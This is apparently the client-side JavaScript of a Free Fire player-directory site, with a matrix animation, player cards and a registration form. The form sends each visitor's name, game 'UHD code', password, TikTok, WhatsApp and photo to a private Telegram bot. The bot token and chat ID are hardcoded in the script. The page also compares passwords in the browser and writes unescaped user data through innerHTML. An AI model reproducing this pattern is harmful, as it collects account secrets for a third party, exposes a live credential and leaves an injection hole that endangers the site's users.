// LOADER
window.onload = () => {

  setTimeout(() => {

    document.getElementById("loader")
      .style.display = "none";

  }, 2500);

};


// MATRIX EFFECT
const canvas =
  document.getElementById("matrix");

const ctx =
  canvas.getContext("2d");

canvas.width =
  window.innerWidth;

canvas.height =
  window.innerHeight;

const letters =
  "01FFHACKERAURA";

const fontSize = 14;

const columns =
  canvas.width / fontSize;

const drops = [];

for(let i = 0; i < columns; i++){

  drops[i] = 1;

}

function drawMatrix(){

  ctx.fillStyle =
    "rgba(0,0,0,0.05)";

  ctx.fillRect(
    0,
    0,
    canvas.width,
    canvas.height
  );

  ctx.fillStyle = "#ff003c";

  ctx.font =
    fontSize + "px monospace";

  for(let i = 0; i < drops.length; i++){

    const text =
      letters.charAt(
        Math.floor(
          Math.random() * letters.length
        )
      );

    ctx.fillText(
      text,
      i * fontSize,
      drops[i] * fontSize
    );

    if(
      drops[i] * fontSize >
      canvas.height &&
      Math.random() > 0.975
    ){

      drops[i] = 0;

    }

    drops[i]++;

  }

}

setInterval(drawMatrix, 35);


// RESPONSIVE MATRIX
window.addEventListener(
  "resize",
  () => {

    canvas.width =
      window.innerWidth;

    canvas.height =
      window.innerHeight;

  }
);


// PLAYERS
const playersContainer =
  document.getElementById("playersContainer");

function displayPlayers(){

  playersContainer.innerHTML = "";

  players.forEach((player, index) => {

    const card =
      document.createElement("div");

    card.classList.add("player-card");

    card.innerHTML = `

      <img src="${player.image}"
           alt="${player.name}">

      <div class="player-info">

        <h3>${player.name}</h3>

        <p>🎮 UHD ID : ${player.uid}</p>

        <p>⭐ Niveau : ${player.level}</p>

        <p>🏆 Rang : ${player.rank}</p>

        <p>📱 TikTok : ${player.tiktok}</p>

        <p>📞 WhatsApp : ${player.whatsapp}</p>

        <p class="description">
          ${player.description || "FREE FIRE PLAYER MERCI DE M'AJOUTER EN AMI 😎✅"}
        </p>

        <p class="aura-badge">
          ⚡ AURA MAX ⚡
        </p>

        <input type="password"
               placeholder="Mot de passe"
               class="code-input"
               id="pass-${index}">

        <button onclick="showCode(${index})">

          Voir UHD Code

        </button>

        <div id="result-${index}"
             class="hidden-code"></div>

      </div>

    `;

    playersContainer.appendChild(card);

  });

}

displayPlayers();


// SHOW UHD CODE
function showCode(index){

  const input =
    document.getElementById(
      `pass-${index}`
    );

  const result =
    document.getElementById(
      `result-${index}`
    );

  if(
    input.value ===
    players[index].password
  ){

    result.innerHTML = `

      <p>
        ✅ UHD CODE :
        ${players[index].code}
      </p>

      <button onclick="copyCode('${players[index].code}')">

        📋 Copier UHD Code

      </button>

    `;

  } else {

    result.innerHTML =
      "❌ Mot de passe incorrect";

  }

}


// COPY UHD CODE
function copyCode(code){

  navigator.clipboard
  .writeText(code)

  .then(() => {

    alert(
      "✅ UHD CODE copié 😎"
    );

  });

}


// SEARCH PLAYER
document
.getElementById("search")
.addEventListener(
  "keyup",
  function(){

    const value =
      this.value.toLowerCase();

    const cards =
      document.querySelectorAll(".player-card");

    cards.forEach(card => {

      const text =
        card.innerText.toLowerCase();

      if(text.includes(value)){

        card.style.display =
          "block";

      } else {

        card.style.display =
          "none";

      }

    });

});


// FORM
const form =
  document.getElementById("registerForm");

const message =
  document.getElementById("message");

form.addEventListener(
  "submit",
  function(e){

    e.preventDefault();

    const name =
      document.getElementById("name").value;

    const uid =
      document.getElementById("uid").value;

    const level =
      document.getElementById("level").value;

    const rank =
      document.getElementById("rank").value;

    const code =
      document.getElementById("code").value;

    const password =
      document.getElementById("password").value;

    const tiktok =
      document.getElementById("tiktok").value;

    const whatsapp =
      document.getElementById("whatsapp").value;

    const photo =
      document.getElementById("photo").files[0];


    // PHOTO OBLIGATOIRE
    if(!photo){

      message.innerHTML =
        "❌ Choisis une photo avant d'envoyer";

      return;

    }


    // TELEGRAM
    const token =
      "8369361718:AAG2hwt6CzwBfWJsvqkS8NO1-8BfbfhMQs0";

    const chatId =
      "7239404667";


    const text = `

🔥 Nouveau Joueur FF 🔥

👤 Nom : ${name}

🎮 UHD ID : ${uid}

⭐ Niveau : ${level}

🏆 Rang : ${rank}

🔐 UHD CODE : ${code}

🛡️ Password : ${password}

📱 TikTok : ${tiktok}

📞 WhatsApp : ${whatsapp}

    `;


    const formData =
      new FormData();

    formData.append(
      "chat_id",
      chatId
    );

    formData.append(
      "caption",
      text
    );

    formData.append(
      "photo",
      photo
    );


    fetch(
      `https://api.telegram.org/bot${token}/sendPhoto`,
      {
        method:"POST",
        body:formData
      }
    )

    .then(() => {

      message.innerHTML = `

🔥 Reviens dans 24h ou moins 🙂

kawaki227 va enregistrer votre compte sur le site.

Merci de patienter 😎

      `;

      form.reset();

      preview.style.display =
        "none";

    })

    .catch(() => {

      message.innerHTML =
        "❌ Erreur d'envoi";

    });

});


// PHOTO PREVIEW
const photoInput =
  document.getElementById("photo");

const preview =
  document.getElementById("preview");

photoInput.addEventListener(
  "change",
  function(){

    const file =
      this.files[0];

    if(file){

      preview.style.display =
        "block";

      preview.src =
        URL.createObjectURL(file);

    }

});


// CLICK UPLOAD BOX
function choosePhoto(){

  document.getElementById("photo")
    .click();

}